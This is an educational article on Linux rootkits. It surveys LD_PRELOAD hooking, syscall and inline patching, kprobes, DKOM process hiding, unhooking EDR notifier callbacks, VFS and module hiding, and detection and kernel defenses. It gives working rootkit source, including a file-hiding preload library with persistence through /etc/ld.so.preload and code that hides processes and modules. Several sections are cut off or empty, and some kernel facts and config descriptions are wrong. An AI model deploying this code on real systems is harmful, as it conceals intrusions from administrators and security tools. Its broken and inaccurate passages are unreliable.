Rootkits

Kernel and user-mode stealth techniques, from DKOM and syscall hooking to eBPF abuse and cross-view detection on modern Linux.

Overview

A rootkit hides privileged access by intercepting the interfaces used to inspect a system. This article surveys user-mode LD_PRELOAD hooks, kernel syscall and VFS patching, direct kernel object manipulation, callback and network stack tampering, and eBPF abuse. It then shows the cross-view detection principle and the tools that apply it.

What Is a Rootkit

A rootkit is software that obtains and maintains privileged access while concealing its presence from system administrators and security tools. The term originates from the combination of "root" (the Unix superuser) and "kit" (a collection of tools). Rootkits operate on a simple principle: intercept the interfaces that administrators and tools use to inspect the system, then filter out evidence of the rootkit's existence.

Category Items
Privilege User-mode (ring 3); Kernel-mode (ring 0); Hypervisor (ring -1); Firmware/BIOS/UEFI (ring -2 / SMM)
Stealth Active (hooks, patching); Passive (DKOM - modifying kernel objects directly); Evasive (trigger-based activation, timer-based)
Target Process hiding; File/registry hiding; Network connection hiding; Module/driver hiding; Credential theft (syscall spoofing); Data exfiltration (keylogger, packet sniffer)

A rootkit's survival depends on staying invisible. When the administrator runs ls , you must intercept the getdents64() or getdents() system call. When they run ps aux , you intercept readdir() on /proc . When they run lsmod , you hide your module from the kernel's module list. Every user-space tool is just a chain of system calls; control the system call layer, and you control what the administrator sees.

User-Mode Rootkits

User-mode rootkits operate entirely in ring 3. They hook library functions, typically through LD_PRELOAD injection, ptrace() -based process injection, or dynamic linker manipulation.

LD_PRELOAD rootkit example

// rootkit_preload.c — intercept readdir64() to hide files
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>

typedef struct dirent64* (*orig_readdir64_t)(DIR*);

static const char *hidden_files[] = {
    "rootkit.ko", "rk_hidden", "malware.bin", NULL
};

struct dirent64 *readdir64(DIR *dirp) {
    orig_readdir64_t orig_readdir64;
    orig_readdir64 = (orig_readdir64_t)dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        int match = 0;
        for (int i = 0; hidden_files[i] != NULL; i++) {
            if (strstr(entry->d_name, hidden_files[i])) {
                match = 1;
                break;
            }
        }
        if (!match) return entry;
        // Hidden file — skip to next entry
    }
    return NULL;
}

Deploying a preload rootkit

# Compile as shared library
gcc -shared -fPIC -o /tmp/librootkit.so rootkit_preload.c -ldl

# Test by overriding readdir
LD_PRELOAD=/tmp/librootkit.so ls /tmp

# Persistent via /etc/ld.so.preload
sudo sh -c 'echo "/tmp/librootkit.so" >> /etc/ld.so.preload'
# WARNING: This breaks the system if the library is buggy.
# Recovery: boot from live USB, remove the line from /etc/ld.so.preload

Detection of LD_PRELOAD rootkits

# Check for preloaded libraries
cat /etc/ld.so.preload

# Examine process maps for unexpected libraries
cat /proc/$$/maps | grep -v '^[0-9a-f]*-[0-9a-f]* r'

# Check environment
LD_PRELOAD="" ls /tmp
LD_PRELOAD="" /bin/ls -la /tmp

# Statically linked binaries bypass LD_PRELOAD
busybox ls -la /tmp

User-mode rootkits are fragile. A statically-linked binary ignores LD_PRELOAD . A containerized application has a separate mount namespace. strace reveals the real syscall traffic. They persist poorly across library updates. But they require no kernel privileges: the attacker only needs user-level code execution.

Syscall Table Hooking

Kernel-mode rootkits run at ring 0 and can intercept every system call before any user-space tool sees the results. The classic technique is sys_call_table[] modification.

┌─────────────────────────────────────────────────────────────────────┐
│                    SYSCALL TABLE HOOKING                              │
│                                                                      │
│  Before hooking:                                                     │
│    sys_call_table[__NR_getdents64] → sys_getdents64() → VFS → ext4   │
│                                                                      │
│  After hooking:                                                      │
│    sys_call_table[__NR_getdents64] → rk_getdents64()                 │
│                                        │                             │
│                                        ├→ sys_getdents64() (real)    │
│                                        │      │                      │
│                                        │      ▼                      │
│                                        │  [dentry list from VFS]     │
│                                        │      │                      │
│                                        └→ FILTER OUT hidden entries  │
│                                               │                      │
│                                               ▼                      │
│                                          return filtered list        │
└─────────────────────────────────────────────────────────────────────┘

Historical Hooking

// OBSOLETE — sys_call_table was exported until Linux 2.4
// Do not use on modern kernels — provided for historical understanding
extern void *sys_call_table[];

static asmlinkage long (*orig_getdents64)(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count);

static asmlinkage long rk_getdents64(unsigned int fd,
    struct linux_dirent64 __user *dirent, unsigned int count) {

    long ret = orig_getdents64(fd, dirent, count);

    // Scan returned entries and remove hidden ones
    struct linux_dirent64 *prev = NULL, *curr = dirent;
    while ((void*)curr < (void*)dirent + ret) {
        if (strstr(curr->d_name, "hidden_file")) {
            if (prev)
                prev->d_reclen += curr->d_reclen; // Coalesce
            else
                ret -= curr->d_reclen; // Remove first entry
        } else {
            prev = curr;
        }
        curr = (void*)curr + curr->d_reclen;
    }
    return ret;
}

// Modern kernels: sys_call_table is not exported.
// Must find it by scanning /proc/kallsyms or using kprobes.

Finding sys_call_table

# sys_call_table is now unexported and in .rodata (read-only)
sudo cat /proc/kallsyms | grep sys_call_table
# ffffffff820001e0 R sys_call_table  ← 'R' = read-only .rodata

# Check if kernel is RWX-restricted
sudo cat /proc/kallsyms | head -5 | awk '{print $2}'
# T = text (code), R = read-only data, D = initialized data

# Attempting to write to sys_call_table on modern kernels:
# → Triggers page fault → kernel oops/panic
# → CR0.WP (Write Protect) must be disabled first

CR0 Write Protect bypass

// DISABLING CR0.WP — another obsolete technique on modern kernels
// CONFIG_STRICT_KERNEL_RWX makes this impossible on 5.x+

static inline void disable_write_protection(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~0x10000;  // Clear bit 16 (WP)
    asm volatile("mov %0, %%cr0" : : "r"(cr0));
}

static inline void enable_write_protection(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= 0x10000;
    asm volatile("mov %0, %%cr0" : : "r"(cr0));
}

// On CONFIG_STRICT_KERNEL_RWX: kernel .text is mapped with 2MB pages.
// Modifying CR0.WP fails because the 2MB page is mapped read-only at the page table level.

Modern kernels make syscall table hooking impractical. CONFIG_STRICT_KERNEL_RWX (enabled by default since 4.15) maps kernel text and read-only data with proper page permissions. CONFIG_MODULE_SIG_FORCE prevents unsigned modules from loading. The sys_call_table[] is in .rodata which is mapped read-only at the hardware page table level.

Inline Function Patching

Instead of modifying the syscall table (which is read-only), rootkits can patch the prologue of the target function itself:

Original function prologue:
  0xffffffff8123abc0 <sys_getdents64+0>:  push   rbp
  0xffffffff8123abc1 <sys_getdents64+1>:  mov    rbp, rsp
  0xffffffff8123abc4 <sys_getdents64+4>:  push   r15
  ...

After inline patching:
  0xffffffff8123abc0 <sys_getdents64+0>:  jmp    0xffffffffc0001000  (rk handler)
  0xffffffff8123abc5 <sys_getdents64+5>:  nop                       (pad)
  ...

rk handler (in writable .ko memory):
  rk_getdents64:
    call orig_getdents64_5bytes   ; execute first 5 original bytes
    ; ... filter results ...
    ret
						
// Inline hook with ftrace infrastructure (supported method)
#include <linux/ftrace.h>
#include <linux/kprobes.h>

// Use ftrace to redirect function — kernel-supported mechanism
// ftrace uses a call to mcount at every function entry that can be redirected

static void notrace rk_callback(unsigned long ip, unsigned long parent_ip,
    struct ftrace_ops *ops, struct ftrace_regs *fregs) {
    // Intercept the function call
    // Modify return value, skip execution, etc.
}

static struct ftrace_ops rk_ops = {
    .func = rk_callback,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY,
};

kprobes Attack Surface

// Register a kprobe to intercept any kernel function
// kprobes are loaded as kernel modules — need CAP_SYS_MODULE
#include <linux/kprobes.h>

static struct kprobe kp;

static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    // Called BEFORE the probed instruction executes
    // Can inspect/modify registers, stack, memory
    unsigned int fd = (unsigned int)regs->di;  // first argument (x86-64)
    if (fd == TARGET_FD) {
        regs->si = 0;  // Zero the count argument → returns 0 entries
    }
    return 0;
}

static int __init rk_init(void) {
    kp.pre_handler = handler_pre;
    kp.symbol_name = "sys_getdents64";
    if (register_kprobe(&kp) < 0) {
        pr_err("Failed to register kprobe\n");
        return -1;
    }
    return 0;
}

// kprobes in kernel .text are also protected by CONFIG_STRICT_KERNEL_RWX
// On modern kernels, kprobes use INT3 breakpoints (trap-based, not direct patching)

Direct Object Manipulation (DKOM)

DKOM is the technique of directly modifying kernel data structures in memory rather than hooking the functions that access them. No code path interception is needed: the attacker simply corrupts the data that enumeration functions walk.

┌──────────────────────────────────────────────────────────────────────┐
│                     DKOM: PROCESS HIDING                              │
│                                                                      │
│  task_struct for init (PID 1):                                       │
│    tasks.next → task_struct (PID 100)                                 │
│                  tasks.next → task_struct (MALICIOUS PID 666)         │
│                                tasks.next → task_struct (PID 200)     │
│                                              tasks.next → ...        │
│                                                                      │
│  After DKOM (unlink PID 666):                                        │
│    tasks.next → task_struct (PID 100)                                 │
│                  tasks.next → task_struct (PID 200)  ← SKIP 666      │
│                                tasks.next → ...                      │
│                                                                      │
│  PID 666 still runs! But ps/top/procfs won't show it.               │
│  Scheduler still schedules it — runqueues are separate from task list.│
└──────────────────────────────────────────────────────────────────────┘

Walking the Task List

#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/list.h>

static void hide_process(pid_t target_pid) {
    struct task_struct *task, *target = NULL;

    rcu_read_lock();
    for_each_process(task) {
        if (task->pid == target_pid) {
            target = task;
            break;
        }
    }
    rcu_read_unlock();

    if (!target) return;

    // DELETE from the task list — this is what ps/top walk
    write_lock_irq(&tasklist_lock);
    list_del_rcu(&target->tasks);
    // Also remove from the thread group
    list_del_rcu(&target->thread_group);
    write_unlock_irq(&tasklist_lock);

    // The PID lookup table must also be cleaned
    // See: kernel/pid.c - attach_pid(), pid_task(), find_task_by_vpid()
}

// Recovery: process is still on scheduler runqueues
// Can be found by iterating runqueues directly
// /proc/sched_debug or kernel debugger can discover it

The PID Table

// kernel/pid.c - the PID allocation and lookup infrastructure
// Modern kernels (5.x+) keep pids in an IDR per PID namespace; the old
// pid_hash[] chain (struct upid.pid_chain) was removed and must not be used.

struct upid {
    int nr;                       // the PID number in this namespace
    struct pid_namespace *ns;     // namespace this PID is visible in
};

struct pid {
    refcount_t count;             // reference count
    unsigned int level;           // number of upid entries
    spinlock_t lock;              // protects the IDR and task lists
    struct hlist_head tasks[PIDTYPE_MAX]; // tasks attached by type
    struct upid numbers[];        // one entry per namespace level
};

// find_task_by_vpid(nr) resolves nr through the namespace IDR, then follows
// pid->tasks[PIDTYPE_PID] to the task_struct. Removing the task from that
// hlist prevents find_task_by_vpid() from locating the process.

Full Process Hiding

static void dkom_hide_process(struct task_struct *target) {
    // 1. Remove from task list (affects /proc scanning, ps)
    write_lock_irq(&tasklist_lock);
    list_del_rcu(&target->tasks);
    list_del_rcu(&target->thread_group);
    write_unlock_irq(&tasklist_lock);

    // 2. Detach from the PID lookup table (affects find_task_by_vpid, kill())
    //    Modern kernels use an IDR per PID namespace; there is no pid_chain.
    //    Unlinking pid_links[PIDTYPE_PID] makes pid_task() miss the task.
    write_lock_irq(&tasklist_lock);
    hlist_del_rcu(&target->pid_links[PIDTYPE_PID]);
    write_unlock_irq(&tasklist_lock);

    // 3. Clear /proc/PID directory entries
    // The proc inode still exists but find_task_by_vpid returns NULL
    // from lookup → proc_pid_instantiate → returns -ENOENT

    // 4. Remove from parent's children list
    write_lock_irq(&tasklist_lock);
    list_del_rcu(&target->sibling);
    write_unlock_irq(&tasklist_lock);

    // Process still has:
    // - A slot on the scheduler runqueue
    // - Signal handlers registered
    // - Memory mappings in /proc/PID/maps (inode still exists)
    // - File descriptors open (VFS layer unaware of DKOM)
}

Callback Manipulation

The kernel uses notification chains extensively to inform registered drivers of events. Rootkits that register themselves on these chains can intercept events. Conversely, rootkits can remove security callbacks to disable EDR /AV protections.

┌──────────────────────────────────────────────────────────────────────┐
│                    NOTIFICATION CHAIN HOOKING                          │
│                                                                      │
│  Process creation notify chain (proc_event_chain):                    │
│                                                                      │
│  do_execve() → security_bprm_creds() → ...                           │
│         │                                                            │
│         ▼                                                            │
│  notifier_call_chain(&proc_event_chain, ...)                         │
│         │                                                            │
│         ├─► EDR callback: log process creation                       │
│         ├─► Audit subsystem: record execve event                     │
│         ├─► ROOTKIT callback: steal credentials, inject DLL          │
│         └─► TTY audit: record terminal input                         │
│                                                                      │
│  To disable EDR: unregister its callback from the chain.             │
│  Or: register before it in the chain and consume the event.          │
└──────────────────────────────────────────────────────────────────────┘

Linux notification chains

// include/linux/notifier.h
// Four types of notifier chains:

// 1. Atomic notifier chain — runs in interrupt context, RCU-protected
struct atomic_notifier_head {
    spinlock_t lock;
    struct notifier_block __rcu *head;
};

// 2. Blocking notifier chain — runs in process context, may sleep
struct blocking_notifier_head {
    struct rw_semaphore rwsem;
    struct notifier_block __rcu *head;
};

// 3. Raw notifier chain — no locking, caller manages exclusion
struct raw_notifier_head {
    struct notifier_block __rcu *head;
};

// 4. SRCU notifier chain — sleepable RCU variant
struct srcu_notifier_head {
    struct mutex mutex;
    struct srcu_struct srcu;
    struct notifier_block __rcu *head;
};

// A notifier_block represents one callback:
struct notifier_block {
    notifier_fn_t notifier_call;   // callback function
    struct notifier_block __next *next;  // linked list
    int priority;                  // call order (higher = earlier)
};

Manipulating Callbacks

// Disable a security module's callback by removing its notifier_block
static struct notifier_block *find_edr_callback(
    struct blocking_notifier_head *head, const char *module_name) {

    struct notifier_block *nb;
    struct module *mod;

    mutex_lock(&module_mutex);
    mod = find_module(module_name);
    mutex_unlock(&module_mutex);

    if (!mod) return NULL;

    down_read(&head->rwsem);
    for (nb = head->head; nb != NULL; nb = nb->next) {
        // Check if callback belongs to EDR module's code range
        if ((unsigned long)nb->notifier_call >= (unsigned long)mod->core_layout.base &&
            (unsigned long)nb->notifier_call < (unsigned long)mod->core_layout.base +
                                               mod->core_layout.size) {
            up_read(&head->rwsem);
            return nb;
        }
    }
    up_read(&head->rwsem);
    return NULL;
}

// inetaddr_chain            — IP address changes

VFS Hooking

The Virtual File System (VFS) is the abstraction layer through which every filesystem access passes. By replacing file_operations pointers, a rootkit can intercept read() , write() , readdir() , and ioctl() on arbitrary files.

VFS readdir hooking (kernel module)

#include <linux/fs.h>
#include <linux/dcache.h>

static int (*orig_iterate_shared)(struct file *, struct dir_context *);

struct dir_context_filtered {
    struct dir_context ctx;
    struct dir_context *real_ctx;
};

static bool filldir_filtered(struct dir_context *ctx,
    const char *name, int namelen, loff_t offset,
    u64 ino, unsigned d_type) {

    struct dir_context_filtered *fctx =
        container_of(ctx, struct dir_context_filtered, ctx);

    // Hide files matching hidden pattern
    if (namelen == 8 && strncmp(name, "rootkit_", 8) == 0)
        return true;  // true = continue (skip)
    if (namelen == 5 && strncmp(name, ".loot", 5) == 0)
        return true;

    return fctx->real_ctx->actor(fctx->real_ctx, name, namelen,
                                 offset, ino, d_type);
}

static int rk_iterate_shared(struct file *file, struct dir_context *ctx) {
    struct dir_context_filtered fctx = {
        .ctx.actor = filldir_filtered,
        .real_ctx = ctx,
    };
    return orig_iterate_shared(file, &fctx.ctx);
}

// Install hook on /proc:
// For each process's /proc/PID/ directory, replace iterate_shared
static void hook_proc_dir(struct inode *inode) {
    struct file_operations *fops = (struct file_operations *)inode->i_fop;
    orig_iterate_shared = fops->iterate_shared;
    fops->iterate_shared = rk_iterate_shared;
}

Network Stack Hooking

Rootkits hiding network connections intercept the functions that enumerate them: net_device operations, /proc/net/tcp , /proc/net/udp , and the netlink interface used by ss and netstat .

eBPF Abuse

The Berkeley Packet Filter evolved from a simple packet filter into a general-purpose in-kernel virtual machine. eBPF programs can attach to hundreds of kernel hooks: syscalls, tracepoints, kprobes, socket operations, and more. A malicious eBPF program is a rootkit built on the kernel's own infrastructure.

┌──────────────────────────────────────────────────────────────────────┐
│                       eBPF-BASED ROOTKIT                              │
│                                                                      │
│  User space:                                                         │
│    ┌──────────────┐                                                  │
│    │ eBPF program │  (.o ELF file)                                   │
│    │     +        │                                                  │
│    │ eBPF loader  │  (bpf() syscall)                                 │
│    └──────+───────┘                                                  │
│           │                                                          │
│           ▼                                                          │
│  Kernel space:                                                       │
│    ┌──────────────────────────────────────────────┐                  │
│    │         eBPF Verifier (safety check)          │                  │
│    │  - Bounds checking (no out-of-bounds access)  │                  │
│    │  - Control flow integrity (no loops pre-5.3)  │                  │
│    │  - Type safety (must not read arbitrary mem)  │                  │

Module Hiding

When you run lsmod , it reads /proc/modules , which iterates the kernel's linked list of loaded struct module objects. Removing a module from this list makes it invisible to lsmod .

┌──────────────────────────────────────────────────────────────────────┐
│                       MODULE LIST MANIPULATION                         │
│                                                                      │
│  Kernel maintains a doubly-linked list of struct module:              │
│                                                                      │
│    modules (head) → [ext4] ←→ [kvm] ←→ [rootkit.ko] ←→ [vboxdrv]   │
│                                          │                           │
│                                   modules.prev = kvm                 │
│                                   modules.next = vboxdrv              │
│                                                                      │
│  After list_del(&rootkit.modules):                                   │
│    modules (head) → [ext4] ←→ [kvm] ←─────────→ [vboxdrv]           │
│                                                                      │
│  rootkit.ko still loaded! Still functioning!                          │
│  But lsmod won't show it. /proc/modules won't show it.               │
│                                                                      │
│  Caveat: /sys/module/rootkit/ still exists (sysfs has own list)      │
│  Solution: also remove from sysfs: kobject_del(&rootkit->mkobj.kobj) │
└──────────────────────────────────────────────────────────────────────┘
						
// Module hiding in a kernel module
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>

static void hide_module(struct module *mod) {
    // 1. Remove from modules list
    mutex_lock(&module_mutex);
    list_del_init(&mod->list);
    mutex_unlock(&module_mutex);

    // 2. Remove from sysfs (optional but recommended)
    // This prevents /sys/module/<name>/ from revealing the module
    if (mod->mkobj.kobj.state_initialized) {
        kobject_del(&mod->mkobj.kobj);
    }

    // 3. Clear the module's reference to the linked list
    mod->list.prev = LIST_POISON2;
    mod->list.next = LIST_POISON1;

    // 4. Remove from mod_tree (the red-black tree used for module lookup)
    mod_tree_remove(mod);

    pr_info("Module %s hidden\n", mod->name);
}

// Unhidden: doesn't show in lsmod but can be found via:
// - /sys/kernel/debug/tracing/printk_formats
// - kallsyms (if module symbols are still present)
// - Function pointer inspection (who's handling that interrupt?)

Detecting hidden modules

# 1. Compare kallsyms with /proc/modules
# kallsyms shows symbols from all loaded code including hidden modules
sudo cat /proc/kallsyms | grep -E '\[.*\]$' | awk '{print $NF}' | \
    tr -d '[]' | sort -u > /tmp/kallsyms_modules
cut -d' ' -f1 /proc/modules | sort > /tmp/proc_modules
diff /tmp/kallsyms_modules /tmp/proc_modules
# Any module in kallsyms but not in /proc/modules is hidden!

# 2. Kernel address space map
sudo cat /proc/modules
sudo cat /proc/vmallocinfo | grep -i module

# 3. ftrace function filtering
sudo cat /sys/kernel/debug/tracing/available_filter_functions | \
    grep -E '^[a-z_]+ \[[^]]+\]' | sed 's/.*\[\(.*\)\]/\1/' | sort -u

Stealth Detection Techniques

Detection operates on the cross-view principle: examine the same ground truth through two independent interfaces and diff the results.

Resource Primary View Alternative View
Processes /proc (task list) Scheduler runqueues; kill() PID walk; /proc/sched_debug
Files getdents64() Raw block device read; debugfs inode walk
Network conns /proc/net/tcp; ss -tlnp Netfilter conntrack; Raw packet capture; /proc/net/nf_conntrack
Modules /proc/modules /proc/kallsyms; /sys/kernel/debug/*; vmallocinfo
Syscall handlers Function trace Direct syscall invocation; + return value comparison

eBPF-based detection

// Detect hidden processes via an eBPF program that hooks the scheduler
// Every time the scheduler switches to a task, record the PID
// Compare with /proc listing periodically

SEC("tracepoint/sched/sched_switch")
int trace_sched_switch(struct sched_switch_args *ctx) {
    u32 next_pid = ctx->next_pid;
    // Record PID in a BPF map
    u64 *count = bpf_map_lookup_elem(&pid_seen, &next_pid);
    if (count)
        *count += 1;
    else
        bpf_map_update_elem(&pid_seen, &next_pid, &(u64){1}, BPF_ANY);
    return 0;
}

Kernel Defenses Against Rootkits

Config Option Description
CONFIG_MODULE_SIG; CONFIG_MODULE_SIG_FORCE; CONFIG_MODULE_SIG_ALL Require modules to have valid signatures; Reject unsigned modules (no override); Sign all modules during kernel build
CONFIG_STRICT_KERNEL_RWX; CONFIG_STRICT_MODULE_RWX; CONFIG_DEBUG_SET_MODULE_RONX Kernel text/rodata mapped read-only at HW; Module memory separated into RX+RW pages; Detect tampering with module read-only data (set_memory_rw/ro tracking)
CONFIG_LOCK_DOWN_KERNEL (lockdown=integrity/confidentiality) Disable runtime kernel features in Secure Boot mode: kexec, /dev/mem, BPF, module params, debugfs, etc.
CONFIG_KASLR; CONFIG_RANDOMIZE_BASE Randomize kernel base address (64-bit: entropy limited by KASAN/CPU alignment); Entropy: 28 bits (x86_64), ~12 bits arm64
CONFIG_PAGE_TABLE_ISOLATION; CONFIG_CFI_CLANG Prevent modification of kernel page tables from user space (KPTI basis); Control Flow Integrity: validate indirect call targets at runtime (ARM64 available)
CONFIG_ARCH_HAS_UACCESS_FLUSHCACHE; CONFIG_ARCH_HAS_UACCESS_SAFE Supervisor Mode Access Prevention (SMAP) prevents kernel from directly accessing user-space memory without explicit access; Supervisor Mode Execution Prevention (SMEP): no user page execution in kernel
